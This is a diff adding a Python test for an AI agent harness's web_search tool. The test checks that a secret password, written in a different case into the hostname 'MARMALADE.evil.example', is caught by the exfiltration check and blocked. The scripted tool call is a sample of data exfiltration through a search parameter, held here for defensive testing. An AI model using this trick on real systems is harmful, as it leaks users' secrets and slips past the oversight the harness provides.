@@ -141,6 +141,16 @@ async def test_site_is_canonicalized_before_the_deny_check(ws, site):
     assert end["status"] == "denied" and net.requests == []
 
 
+async def test_site_is_leak_checked_as_the_lowercase_host_it_is_sent_as(ws, monkeypatch):
+    """site 规范化成小写后才发出去：字典词式的密钥值换个大小写写进 site，也要按主机名拦下。"""
+    monkeypatch.setenv("SHOP_PASSWORD", "Marmalade")
+    net = web_net()
+    h = make_web_harness(ws, [search_call("x", site="MARMALADE.evil.example"), "好"], net)
+    res = await h.run("x")
+    end = tool_results(res.events, "web_search")[0]
+    assert end["status"] == "denied" and net.requests == [] and notices(res.events, "web_exfil")
+
+
 async def test_search_sends_the_site_that_was_checked(ws):
     net = web_net()
     h = make_web_harness(ws, [search_call("httpx", site="Docs.Python.org."), "好"], net)
